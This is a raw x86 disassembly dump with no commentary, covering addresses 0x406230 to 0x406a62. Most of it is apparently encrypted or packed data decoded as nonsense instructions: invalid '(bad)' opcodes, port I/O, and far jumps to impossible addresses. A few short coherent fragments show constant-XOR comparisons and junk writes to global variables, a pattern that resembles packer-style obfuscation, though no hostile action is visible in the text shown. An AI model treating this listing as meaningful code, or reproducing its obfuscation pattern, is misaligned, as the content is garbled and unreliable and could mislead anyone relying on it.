  406230:	arpl   WORD PTR [ebx-0x6e7233ac],bp
  406236:	jp     0x406214
  406238:	push   ecx
  406239:	xor    BYTE PTR [ebp-0x5162bbb9],ah
  40623f:	dec    esi
  406240:	fst    QWORD PTR [ebx-0x67c83909]
  406246:	out    0x5,al
  406248:	xchg   ebx,eax
  406249:	push   ss
  40624a:	dec    edx
  40624b:	(bad)  
  40624c:	xchg   ebx,eax
  40624d:	loopne 0x406220
  40624f:	push   ebx
  406250:	outs   dx,DWORD PTR ds:[esi]
  406251:	shr    edx,0x3
  406254:	dec    edi
  406255:	add    DWORD PTR [eax],ecx
  406257:	inc    esp
  406258:	mov    cl,0x5d
  40625a:	and    ecx,edx
  40625c:	js     0x4061e1
  40625e:	sbb    ebp,esi
  406260:	inc    ecx
  406261:	loope  0x406279
  406263:	lock pop edi
  406265:	das    
  406266:	push   esp
  406267:	test   eax,0xf74e9d7c
  40626c:	add    al,0x83
  40626e:	scas   al,BYTE PTR es:[edi]
  40626f:	lfs    ecx,FWORD PTR [ebp+0x2b08f182]
  406276:	hlt    
  406277:	jmp    0x4e3f5391
  40627c:	push   0xffffffc6
  40627e:	inc    eax
  40627f:	mul    BYTE PTR [ecx+ecx*1]
  406282:	push   ebp
  406283:	fsubp  st(1),st
  406285:	jns    0x4062ec
  406287:	imul   ecx
  406289:	inc    eax
  40628a:	mov    eax,ds:0x90540b63
  40628f:	aas    
  406290:	pop    ebp
  406291:	imul   esp,eax,0xffffffb6
  406294:	mov    ds:0xc5236cdf,eax
  406299:	jo     0x406306
  40629b:	not    BYTE PTR [ebx]
  40629d:	sub    eax,0x24820222
  4062a2:	std    
  4062a3:	pop    ss
  4062a4:	retf   
  4062a5:	repz fdiv st,st(2)
  4062a8:	in     al,0x17
  4062aa:	xchg   ecx,eax
  4062ab:	fisub  DWORD PTR [edi+0x55566dba]
  4062b1:	cwde   
  4062b2:	cdq    
  4062b3:	adc    eax,0xe9fbccde
  4062b8:	test   ch,bh
  4062ba:	jmp    0xe1e00925
  4062bf:	cmp    edi,DWORD PTR [edi]
  4062c1:	or     BYTE PTR [ecx+esi*8],0xf2
  4062c5:	cdq    
  4062c6:	jno    0x406326
  4062c8:	cs push cs
  4062ca:	adc    dh,ch
  4062cc:	mov    esi,0x3656cf13
  4062d1:	and    ecx,DWORD PTR [edx-0x209cf383]
  4062d7:	jecxz  0x40632d
  4062d9:	outs   dx,BYTE PTR ds:[esi]
  4062da:	imul   edi,DWORD PTR [ebp+0x37],0xffffffd1
  4062de:	dec    BYTE PTR [ebp-0x37]
  4062e1:	pop    edi
  4062e2:	add    eax,0xbfbfc183
  4062e7:	sbb    ebx,eax
  4062e9:	imul   ebx,DWORD PTR [edx+ebx*1+0x17ca4a6f],0x76
  4062f1:	sub    al,0x39
  4062f3:	fdivrp st(0),st
  4062f5:	adc    al,0x51
  4062f7:	(bad)  
  4062f9:	mov    dl,0x5c
  4062fb:	ror    BYTE PTR [ecx-0x4d38baf0],cl
  406301:	leave  
  406302:	nop
  406303:	retf   0x1485
  406306:	in     al,dx
  406307:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406308:	mov    bl,0x34
  40630a:	mov    ah,0x7b
  40630c:	das    
  40630d:	fist   DWORD PTR [esi+0x5f]
  406310:	adc    DWORD PTR [ecx],0xfffffff7
  406313:	(bad)  
  406314:	mov    dh,0xb7
  406316:	push   cs
  406317:	sub    al,0xe9
  406319:	in     eax,dx
  40631a:	or     DWORD PTR [edx+0x1d],0x35b87841
  406321:	dec    ebp
  406322:	cmp    ebp,0xc0277889
  406328:	sub    ah,BYTE PTR [edx-0x68757b8d]
  40632e:	pop    ss
  40632f:	adc    ch,BYTE PTR [esi-0x342e129]
  406335:	cmp    DWORD PTR [esi],eax
  406337:	xor    esp,esi
  406339:	bound  edx,QWORD PTR [eax]
  40633b:	cmp    al,0xf0
  40633d:	out    0xdb,al
  40633f:	aam    0x6e
  406341:	sub    DWORD PTR [esi+0x3026f7b9],edi
  406347:	ret    0xc8aa
  40634a:	dec    ebp
  40634b:	sub    DWORD PTR [ecx+0x2f03f689],esp
  406351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406352:	mov    ch,0xfc
  406354:	add    edx,DWORD PTR fs:[edi-0x774236fa]
  40635b:	and    eax,0xd10f51d9
  406360:	out    0x6d,eax
  406362:	in     al,0x15
  406364:	mov    BYTE PTR [ebx-0x1d0a5282],0x83
  40636b:	jne    0x406344
  40636d:	mov    al,ds:0x8fe3c93c
  406372:	outs   dx,BYTE PTR ds:[esi]
  406373:	mov    edx,0x38b4d173
  406378:	jg     0x4063f7
  40637a:	iret   
  40637b:	cmp    dl,dh
  40637d:	test   dh,dl
  40637f:	inc    ecx
  406380:	mov    eax,ds:0xc830b941
  406385:	sbb    eax,0x42f9873
  40638a:	repz rol DWORD PTR [edx+0x11],cl
  40638e:	xor    BYTE PTR [ecx-0x2a2762ab],al
  406394:	scas   al,BYTE PTR es:[edi]
  406395:	pop    ss
  406396:	je     0x4063aa
  406398:	lock pop esp
  40639a:	test   al,0xec
  40639c:	add    eax,0x95b01bc5
  4063a1:	jl     0x406380
  4063a3:	cmp    ecx,edx
  4063a5:	jmp    0x3390d14c
  4063aa:	pop    edi
  4063ab:	aas    
  4063ac:	cld    
  4063ad:	inc    ecx
  4063ae:	add    esi,eax
  4063b0:	xor    BYTE PTR [ebp-0x700349c7],0x21
  4063b7:	js     0x40634f
  4063b9:	call   0xa6a8:0x4dd7ba9c
  4063c0:	cld    
  4063c1:	inc    ecx
  4063c2:	popa   
  4063c3:	test   al,0xee
  4063c5:	rcl    BYTE PTR [edx+0x71cc31d7],0xca
  4063cc:	pop    esi
  4063cd:	(bad)  
  4063ce:	fisttp DWORD PTR [ebx-0xa24ab81]
  4063d4:	xchg   ecx,eax
  4063d5:	adc    DWORD PTR [eax+0x16],0x1f8d5b8e
  4063dc:	adc    dl,BYTE PTR [edx]
  4063de:	xor    ch,al
  4063e0:	mov    BYTE PTR [ebp-0x46],0xf3
  4063e4:	mov    ebp,0x1d4d9f84
  4063e9:	xor    eax,0xc555692e
  4063ee:	in     al,0xce
  4063f0:	inc    ebx
  4063f1:	jne    0x406466
  4063f3:	mov    dh,0xe5
  4063f5:	scas   eax,DWORD PTR es:[edi]
  4063f6:	fiadd  WORD PTR [ebx-0x372f7235]
  4063fc:	mov    bh,0x18
  4063fe:	adc    eax,0xf3c89940
  406403:	add    eax,0x17a9ba8
  406408:	ret    0x5a93
  40640b:	hlt    
  40640c:	fidivr WORD PTR [eax+0x20a50817]
  406412:	jl     0x406418
  406414:	addr16 retf 
  406416:	xchg   ecx,ecx
  406418:	cld    
  406419:	call   0x8f8:0xb58e069b
  406420:	hlt    
  406421:	jbe    0x405c26
  406427:	pop    ebx
  406428:	mov    eax,0xf89c8532
  40642d:	pop    edi
  40642e:	pop    esi
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430486,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e762
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430492
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4304b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e762,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e75a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x1628adad]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	pop    edx
  4064ae:	(bad)  
  4064af:	into   
  4064b0:	mov    ecx,0x71a4ea05
  4064b5:	les    ebp,FWORD PTR [edi-0x59681be9]
  4064bb:	adc    cl,BYTE PTR [esp+ebx*1+0x1f]
  4064bf:	mov    ds:0x9639a88e,eax
  4064c4:	stos   DWORD PTR es:[edi],eax
  4064c5:	xchg   DWORD PTR [ebx-0x2f703b8],ebp
  4064cb:	jnp    0x4064a8
  4064cd:	out    0xfc,eax
  4064cf:	scas   eax,DWORD PTR es:[edi]
  4064d0:	shl    DWORD PTR [edi+0x41],1
  4064d3:	push   ebx
  4064d4:	adc    ecx,ecx
  4064d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064d7:	and    eax,0x903fd6b0
  4064dc:	lock jg 0x40646d
  4064df:	lahf   
  4064e0:	inc    eax
  4064e1:	or     ecx,edi
  4064e3:	sub    eax,0x36716011
  4064e8:	aas    
  4064e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064ea:	push   ecx
  4064eb:	rcl    ebp,0xe6
  4064ee:	mov    gs,WORD PTR [eax]
  4064f0:	xor    DWORD PTR [edi-0x2a],ebp
  4064f3:	pop    eax
  4064f4:	xor    BYTE PTR [eax],ah
  4064f6:	or     al,0xe
  4064f8:	inc    ecx
  4064f9:	cs mov ebx,0xbe98a6cb
  4064ff:	sbb    DWORD PTR [ebx],ebp
  406501:	ret    0xd663
  406504:	in     eax,0xcb
  406506:	xchg   ebx,eax
  406507:	test   BYTE PTR [eax+0x5d250a8e],cl
  40650d:	or     BYTE PTR [edx-0x29],al
  406510:	dec    eax
  406511:	call   0x68064d8c
  406516:	mov    al,0x1b
  406518:	in     eax,dx
  406519:	je     0x406551
  40651b:	inc    ebp
  40651c:	shl    DWORD PTR [edi+edx*2-0x17dbd59a],1
  406523:	mov    edi,ds
  406525:	ror    BYTE PTR [esi-0x52],0x1f
  406529:	out    0x7b,eax
  40652b:	mov    BYTE PTR [eax],dl
  40652d:	and    ah,BYTE PTR [edi]
  40652f:	pop    esi
  406530:	sahf   
  406531:	cmp    DWORD PTR [edi],0x2d0e4ee1
  406537:	inc    esp
  406538:	retf   
  406539:	push   0xe7d7ead5
  40653e:	or     DWORD PTR [eax],edi
  406540:	int    0xfe
  406542:	std    
  406543:	sar    eax,cl
  406545:	dec    esi
  406546:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406547:	sub    ecx,DWORD PTR [edx+0x48fa0a8e]
  40654d:	mov    edi,0x1ae36db0
  406552:	outs   dx,BYTE PTR ds:[esi]
  406553:	out    0x9c,eax
  406555:	imul   ebx,DWORD PTR [ebx],0x6f7b751f
  40655b:	adc    BYTE PTR [ebp-0x11],dh
  40655e:	push   edx
  40655f:	mov    esp,0x1af4bf16
  406564:	iret   
  406565:	push   ecx
  406566:	stos   DWORD PTR es:[edi],eax
  406567:	arpl   WORD PTR ds:0x9034bd8f,cx
  40656d:	dec    ebp
  40656e:	cmp    ah,BYTE PTR ds:0x5abf8cb4
  406574:	push   ebx
  406575:	or     BYTE PTR [edx+0x3d709489],bh
  40657b:	push   esi
  40657c:	daa    
  40657d:	fimul  DWORD PTR [eax+0x29]
  406580:	pop    es
  406581:	int3   
  406582:	push   ebx
  406583:	xor    bl,BYTE PTR [ecx+0x78b52cd3]
  406589:	pop    ebp
  40658a:	pop    edi
  40658b:	scas   al,BYTE PTR es:[edi]
  40658c:	fs jne 0x4065f2
  40658f:	sub    esi,DWORD PTR [edi+0x24864a1a]
  406595:	shl    BYTE PTR [edx],0x32
  406598:	jle    0x4065f4
  40659a:	addr16 mov dh,0x42
  40659d:	xlat   BYTE PTR ds:[ebx]
  40659e:	ret    0x67d0
  4065a1:	xchg   DWORD PTR [eax],eax
  4065a3:	xor    BYTE PTR [ecx+0xfe87420],0xf8
  4065aa:	inc    ecx
  4065ab:	pop    esi
  4065ac:	out    0xa0,al
  4065ae:	fadd   DWORD PTR [ecx-0x5b6cedb8]
  4065b4:	jbe    0x40654a
  4065b6:	in     eax,dx
  4065b7:	into   
  4065b8:	and    al,0x94
  4065ba:	xchg   ebp,eax
  4065bb:	loopne 0x4065c3
  4065bd:	das    
  4065be:	sub    BYTE PTR [ebx+0x135fca0b],dh
  4065c4:	jp     0x4065e6
  4065c6:	cld    
  4065c7:	pop    ss
  4065c8:	mov    esi,0x65d1f615
  4065cd:	in     al,0xca
  4065cf:	iret   
  4065d0:	dec    ebp
  4065d1:	aas    
  4065d2:	mov    cl,0xd9
  4065d4:	out    0xc,eax
  4065d6:	stos   BYTE PTR es:[edi],al
  4065d7:	push   ss
  4065d8:	(bad)  
  4065d9:	pop    ss
  4065da:	enter  0x358c,0xea
  4065de:	iret   
  4065df:	out    dx,eax
  4065e0:	push   edi
  4065e1:	(bad)  
  4065e2:	cmp    bh,BYTE PTR [edi]
  4065e4:	mov    al,BYTE PTR [ebp+0x75227f3a]
  4065ea:	jle    0x40664f
  4065ec:	xchg   edx,eax
  4065ed:	call   0xf7f5:0xc63248e2
  4065f4:	push   edx
  4065f5:	adc    DWORD PTR [eax-0x2],ebp
  4065f8:	rcl    ah,0x5e
  4065fb:	inc    esp
  4065fc:	jp     0x40662e
  4065fe:	stos   BYTE PTR es:[edi],al
  4065ff:	lds    edi,FWORD PTR [eax+eiz*1-0x1f1829b6]
  406606:	push   ecx
  406607:	or     esi,DWORD PTR [ebp-0x59554036]
  40660d:	in     eax,0x8c
  40660f:	push   ds
  406610:	add    al,0x92
  406612:	leave  
  406613:	fisub  WORD PTR [edx-0x3b6ad3b7]
  406619:	adc    ch,dl
  40661b:	dec    ebx
  40661c:	fild   QWORD PTR [edi-0x69]
  40661f:	or     cl,0x1e
  406622:	adc    ebx,esi
  406624:	push   ecx
  406625:	les    edi,FWORD PTR [ebp-0x27]
  406628:	lods   al,BYTE PTR ds:[esi]
  406629:	adc    ebx,0xffffffe2
  40662c:	aas    
  40662d:	mov    esp,0x9f7a66cb
  406632:	mov    WORD PTR [eax+0x5bf6bc3b],?
  406638:	xchg   edx,eax
  406639:	cld    
  40663a:	test   al,0x5
  40663c:	clc    
  40663d:	std    
  40663e:	lods   al,BYTE PTR ds:[esi]
  40663f:	cwde   
  406640:	pop    es
  406641:	cmc    
  406642:	std    
  406643:	das    
  406644:	lahf   
  406645:	clc    
  406646:	cld    
  406647:	mov    bl,0xab
  406649:	mov    esp,0x988424f7
  40664e:	pop    eax
  40664f:	mov    gs,WORD PTR [eax+edx*2]
  406652:	sub    edx,DWORD PTR [si+0x2683]
  406657:	push   edx
  406658:	add    al,0xb9
  40665a:	jmp    0x7b045a
  40665f:	add    DWORD PTR [ecx+0x1c5ff7c2],ecx
  406665:	mov    ds:0x949062bc,al
  40666a:	mov    cl,0xe1
  40666c:	add    cl,cl
  40666e:	pop    ecx
  40666f:	mov    DWORD PTR [edi],edi
  406671:	and    eax,0x979ed69f
  406676:	xchg   DWORD PTR [esi+0x7975a209],ebp
  40667c:	jecxz  0x40667e
  40667e:	or     BYTE PTR [ecx],0x64
  406681:	sbb    BYTE PTR gs:0xd8ea3a54,ch
  406688:	(bad)  
  40668a:	xchg   ebp,eax
  40668b:	dec    esp
  40668c:	or     BYTE PTR [esp+esi*4],bl
  40668f:	jmp    0x406689
  406691:	push   esi
  406692:	jmp    0x18d1d039
  406697:	inc    esi
  406698:	add    DWORD PTR [esi],edx
  40669a:	addr16 js 0x40664d
  40669d:	int    0xdf
  40669f:	jo     0x40669b
  4066a1:	jae    0x40662e
  4066a3:	push   ebp
  4066a4:	adc    al,0x5a
  4066a6:	add    ebx,DWORD PTR [ebx-0x2596b491]
  4066ac:	int    0x59
  4066ae:	cld    
  4066af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066b0:	in     al,0x4c
  4066b2:	adc    DWORD PTR [eax],ebp
  4066b4:	pop    ss
  4066b5:	sbb    cl,BYTE PTR [esi+0x0]
  4066b8:	dec    DWORD PTR [edx]
  4066ba:	in     eax,dx
  4066bb:	dec    esi
  4066bc:	cs inc esp
  4066be:	cmp    eax,0x167c763b
  4066c3:	push   ebx
  4066c4:	cld    
  4066c5:	push   edx
  4066c6:	repz xchg edx,eax
  4066c8:	jg     0x4066d6
  4066ca:	jg     0x406737
  4066cc:	hlt    
  4066cd:	sub    dh,BYTE PTR [edx-0x35ee77b1]
  4066d3:	inc    esi
  4066d4:	xor    BYTE PTR [ebx-0x7ebd425d],dl
  4066da:	fldcw  WORD PTR [ecx-0x3]
  4066dd:	mov    eax,0xb76b3016
  4066e2:	push   ds
  4066e3:	shr    BYTE PTR [eax],1
  4066e5:	mov    DWORD PTR [ebx],edi
  4066e7:	rcl    BYTE PTR [esi+0x2f],1
  4066ea:	adc    al,0xb7
  4066ec:	inc    esi
  4066ed:	or     BYTE PTR [ebx+0x5829a5fc],bh
  4066f3:	dec    eax
  4066f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066f5:	ret    0x945f
  4066f8:	push   0xffffffba
  4066fa:	adc    ebx,ebx
  4066fc:	hlt    
  4066fd:	push   ebx
  4066fe:	(bad)  
  4066ff:	push   0xf6041994
  406704:	sbb    al,0x21
  406706:	jb     0x406708
  406708:	and    al,0x6d
  40670a:	aad    0x6e
  40670c:	rcr    DWORD PTR [ecx],0x2c
  40670f:	mov    edx,0x3324d30d
  406714:	inc    esi
  406715:	jmp    0x2857:0x297cf6ec
  40671c:	mov    dh,0xc9
  40671e:	jge    0x40677f
  406720:	icebp  
  406721:	xor    al,ch
  406723:	scas   eax,DWORD PTR es:[edi]
  406724:	lds    edx,FWORD PTR [ebp-0x6b]
  406727:	bound  ecx,QWORD PTR [ebx]
  406729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40672a:	mov    ds:0xe7e9960c,eax
  40672f:	pusha  
  406730:	xchg   esp,eax
  406731:	arpl   WORD PTR [ebx-0x5],dx
  406734:	xor    BYTE PTR [edi-0x573c9cdb],dh
  40673a:	pop    edx
  40673b:	xor    bl,BYTE PTR [ebx+0x78ff87f4]
  406741:	iret   
  406742:	sbb    DWORD PTR [ebx-0x4a23238d],edx
  406748:	pop    es
  406749:	xor    BYTE PTR ds:0x8a120a05,ch
  40674f:	sbb    eax,0xd9e8462
  406754:	cmp    al,0x9e
  406756:	cmp    al,0x11
  406758:	dec    ebp
  406759:	cmc    
  40675a:	adc    BYTE PTR [ecx+0x59e885bd],bh
  406760:	ja     0x4066ee
  406762:	(bad)  
  406763:	shr    DWORD PTR [ecx],1
  406765:	mov    al,ds:0xbceec632
  40676a:	sbb    eax,0x57c6a0c7
  40676f:	cmp    ebp,DWORD PTR [ebp+0x55]
  406772:	or     al,0xf5
  406774:	add    BYTE PTR [edi+0x36],bh
  406777:	sbb    DWORD PTR [esp+eiz*2],eax
  40677a:	and    DWORD PTR [edi],ecx
  40677c:	stos   DWORD PTR es:[edi],eax
  40677d:	aam    0xce
  40677f:	(bad)  
  406781:	in     eax,dx
  406782:	add    al,0xba
  406784:	pop    eax
  406785:	or     al,0xe7
  406787:	rcr    dh,0x58
  40678a:	mov    ebp,0x5c315232
  40678f:	cmp    BYTE PTR [eax+0x55],ch
  406792:	retf   
  406793:	mov    esi,0x633d1144
  406798:	mov    al,ds:0xffe78418
  40679d:	pop    es
  40679e:	inc    edx
  40679f:	retf   
  4067a0:	and    BYTE PTR [esi+0x16b97ad0],ah
  4067a6:	xchg   ebx,eax
  4067a7:	xor    BYTE PTR [esp+ebx*1-0x78cc12f1],bh
  4067ae:	cmp    DWORD PTR [edi+eiz*1-0x638b55d3],esi
  4067b5:	pop    edx
  4067b6:	outs   dx,BYTE PTR ds:[esi]
  4067b7:	xchg   BYTE PTR [eax+0x5],ch
  4067ba:	(bad)  
  4067bb:	and    BYTE PTR [esi],bl
  4067bd:	cdq    
  4067be:	push   esp
  4067bf:	or     DWORD PTR [ebx+0x6d63b631],ebx
  4067c5:	push   edx
  4067c6:	dec    ebp
  4067c7:	add    ebx,DWORD PTR [ebp+0xfb53b2e]
  4067cd:	ds popf 
  4067cf:	fadd   QWORD PTR [ebp+0x19]
  4067d2:	fdiv   st,st(4)
  4067d4:	xchg   DWORD PTR ds:0x4a7a1e8b,esp
  4067da:	adc    esp,DWORD PTR [ebx]
  4067dc:	jg     0x406816
  4067de:	or     BYTE PTR [ebp+0x45],0xda
  4067e2:	push   ds
  4067e3:	sar    DWORD PTR [ebx],cl
  4067e5:	aam    0x6d
  4067e7:	clc    
  4067e8:	fld    QWORD PTR [edx+0x7f]
  4067eb:	retf   
  4067ec:	jmp    FWORD PTR [ebx]
  4067ee:	xchg   esp,eax
  4067ef:	call   0xa0f3:0xcb4455cf
  4067f6:	dec    ebx
  4067f7:	fwait
  4067f8:	loope  0x40681c
  4067fa:	(bad)
  4067fd:	mov    BYTE PTR [si-0x48ea],0xbc
  406803:	xchg   ecx,eax
  406804:	jns    0x4067e9
  406806:	mov    BYTE PTR [ecx+0x39],ch
  406809:	or     eax,0x5f4dab2e
  40680e:	and    al,BYTE PTR [esi-0x10]
  406811:	mov    dl,0xce
  406813:	inc    edi
  406814:	gs xor al,0x4e
  406817:	into   
  406818:	daa    
  406819:	sti    
  40681a:	mov    esi,DWORD PTR [ebp+0xc]
  40681d:	sbb    DWORD PTR ds:0x42ee24,0x4304aa
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x430552,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43053e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4304ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430556,0x43049a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ee24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	ds mov cl,0x8b
  406896:	mov    edx,0x7e7e364b
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	div    DWORD PTR [edx-0xf004ef8]
  4068a5:	popf   
  4068a6:	cld    
  4068a7:	ret    0xb6a8
  4068aa:	push   edx
  4068ab:	popf   
  4068ac:	hlt    
  4068ad:	or     bl,BYTE PTR [esi]
  4068af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b0:	inc    ecx
  4068b1:	fistp  DWORD PTR [ecx-0x4c]
  4068b4:	inc    edi
  4068b5:	ja     0x4068f9
  4068b7:	inc    ecx
  4068b8:	pop    ss
  4068b9:	sbb    BYTE PTR [edx],dl
  4068bb:	stos   DWORD PTR es:[edi],eax
  4068bc:	rcr    BYTE PTR [ebp+eax*1-0x6c],1
  4068c0:	in     al,0x3d
  4068c2:	into   
  4068c3:	std    
  4068c4:	xor    al,0xd4
  4068c6:	sti    
  4068c7:	das    
  4068c8:	pop    esi
  4068c9:	push   cs
  4068ca:	loopne 0x406860
  4068cc:	jns    0x40686c
  4068ce:	jnp    0x406860
  4068d0:	in     al,0xb6
  4068d2:	out    0x12,eax
  4068d4:	inc    esi
  4068d5:	add    bl,ch
  4068d7:	test   BYTE PTR [edi],0x52
  4068da:	jmp    eax
  4068dc:	push   0x71154ff4
  4068e1:	push   0x25902665
  4068e6:	mov    ah,0xfd
  4068e8:	ss icebp 
  4068ea:	and    ebp,ebp
  4068ec:	sub    eax,0xb2a7c153
  4068f1:	out    dx,al
  4068f2:	(bad)  
  4068f3:	lds    edi,FWORD PTR [edx-0xc]
  4068f6:	cld    
  4068f7:	ins    BYTE PTR es:[edi],dx
  4068f8:	mov    edi,0x93ad7b7c
  4068fd:	popf   
  4068fe:	addr16 mov dh,0x99
  406901:	cmovl  edi,DWORD PTR [edi+0x72e8eb92]
  406908:	cmp    al,0xbf
  40690a:	test   BYTE PTR ds:0x65038ad1,bl
  406910:	test   cl,dl
  406912:	pop    ecx
  406913:	xor    bh,BYTE PTR [edx-0x4c]
  406916:	lods   eax,DWORD PTR ds:[esi]
  406917:	call   DWORD PTR [eax+0x1c]
  40691a:	int    0x77
  40691c:	call   DWORD PTR [ebx-0x30]
  40691f:	mov    ds:0xd169c3e5,al
  406924:	pop    edx
  406925:	dec    edi
  406926:	mov    ds,WORD PTR [eax-0x73]
  406929:	test   BYTE PTR [ebp+0x3089923c],dh
  40692f:	out    0x67,eax
  406931:	push   edx
  406932:	dec    eax
  406933:	add    dh,bh
  406935:	jnp    0x406912
  406937:	es pop ebx
  406939:	repnz fldenv [ecx-0x13]
  40693d:	xchg   esp,eax
  40693e:	or     BYTE PTR [edx],dl
  406940:	mov    eax,DWORD PTR [eax+0x4d]
  406943:	inc    esp
  406944:	push   esi
  406945:	in     eax,dx
  406946:	push   cs
  406947:	dec    ebp
  406948:	mov    ebp,0xc2db6334
  40694d:	pop    ss
  40694e:	cmp    al,0x8a
  406950:	shr    BYTE PTR [bx+di+0x1286],cl
  406955:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406956:	ss std 
  406958:	test   eax,0xa336a18a
  40695d:	ds sbb eax,0x2c342701
  406963:	gs (bad) 
  406965:	fidivr DWORD PTR [ecx]
  406967:	xchg   edx,eax
  406968:	sahf   
  406969:	pop    eax
  40696a:	adc    edx,esi
  40696c:	sti    
  40696d:	repnz fwait
  40696f:	sbb    DWORD PTR [eax-0x2c79bc73],ebp
  406975:	and    al,0x90
  406977:	sahf   
  406978:	jmp    0xa5dbd3a2
  40697d:	xchg   DWORD PTR [edx+0x16],ecx
  406980:	je     0x406996
  406982:	dec    eax
  406983:	jl     0x406966
  406985:	mov    fs,WORD PTR fs:[ebx-0x44]
  406989:	bound  edi,QWORD PTR [eax+0x3b]
  40698c:	dec    edx
  40698d:	cmp    dl,bh
  40698f:	lods   al,BYTE PTR ds:[esi]
  406990:	push   0x2c
  406992:	xchg   ebp,eax
  406993:	into   
  406994:	mov    esi,0x653b73e2
  406999:	scas   eax,DWORD PTR es:[edi]
  40699a:	gs fwait
  40699c:	push   ebx
  40699d:	mov    edx,edi
  40699f:	out    dx,al
  4069a0:	inc    esp
  4069a1:	enter  0x7c5a,0x33
  4069a5:	jmp    0xf4aa8b0e
  4069aa:	jno    0x406a2a
  4069ac:	dec    ecx
  4069ad:	xchg   cl,dh
  4069af:	out    dx,al
  4069b0:	xchg   DWORD PTR [ecx+0x68],edx
  4069b3:	lods   eax,DWORD PTR ds:[esi]
  4069b4:	push   0x0
  4069b6:	jns    0x40694a
  4069b8:	add    BYTE PTR [edi],dl
  4069ba:	mov    WORD PTR [esi],es
  4069bc:	or     DWORD PTR [esi+0x465edea1],eax
  4069c2:	mov    ah,0x32
  4069c4:	jl     0x4069e4
  4069c6:	jp     0x4069ea
  4069c8:	shl    ebp,cl
  4069ca:	test   eax,0x329d6784
  4069cf:	mov    ch,0x57
  4069d1:	aas    
  4069d2:	and    dl,BYTE PTR [ecx-0x441d64f3]
  4069d8:	xor    eax,DWORD PTR [edi-0x25]
  4069db:	and    eax,0xb56ee039
  4069e0:	push   esp
  4069e1:	mov    esi,0x8cdb22d6
  4069e6:	leave  
  4069e7:	arpl   WORD PTR [eax+0x13],cx
  4069ea:	shl    BYTE PTR [edi],0x43
  4069ed:	les    ecx,FWORD PTR [di-0x78]
  4069f1:	pop    edi
  4069f2:	jmp    0x1996:0x23da2af
  4069f9:	int    0x4b
  4069fb:	xchg   ecx,eax
  4069fc:	stos   DWORD PTR es:[edi],eax
  4069fd:	xchg   edx,eax
  4069fe:	ins    BYTE PTR es:[edi],dx
  4069ff:	xchg   ecx,eax
  406a00:	mov    ch,BYTE PTR [eax-0x4e]
  406a03:	(bad)
  406a06:	push   ebp
  406a07:	repnz adc BYTE PTR cs:[ecx],0x5e
  406a0c:	and    ebx,ebx
  406a0e:	fild   DWORD PTR [ebx]
  406a10:	scas   eax,DWORD PTR es:[edi]
  406a11:	mov    ch,0x80
  406a13:	pop    es
  406a14:	adc    eax,0x7bc67fb6
  406a19:	aam    0x53
  406a1b:	xchg   esi,eax
  406a1c:	sub    eax,DWORD PTR [eax+0x1c]
  406a1f:	xor    ah,al
  406a21:	jl     0x406a03
  406a23:	dec    edx
  406a24:	jl     0x406aa4
  406a26:	lea    edi,[ecx]
  406a28:	cmp    ch,BYTE PTR [edx]
  406a2a:	cwde   
  406a2b:	inc    ecx
  406a2c:	and    al,0xc0
  406a2e:	or     BYTE PTR [edx-0x64],0x53
  406a32:	xchg   ebp,eax
  406a33:	mov    esp,0xa78dc935
  406a38:	aam    0x1b
  406a3a:	stc    
  406a3b:	mov    bl,0xb8
  406a3d:	cmp    ecx,DWORD PTR [ecx+0x2ea4f1fa]
  406a43:	and    BYTE PTR [ecx+0x4d],dh
  406a46:	or     ebp,edi
  406a48:	sahf   
  406a49:	add    DWORD PTR ds:0xd76c7d7b,esp
  406a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a50:	out    0x3c,al
  406a52:	ret    
  406a53:	and    al,0xe5
  406a55:	push   ss
  406a56:	aaa    
  406a57:	shl    ah,0xf0
  406a5a:	and    dh,ah
  406a5c:	(bad)  
  406a5d:	jnp    0x406a04
  406a5f:	pop    ebp
  406a60:	dec    ecx
  406a61:	cmc    
  406a62:	cdq    
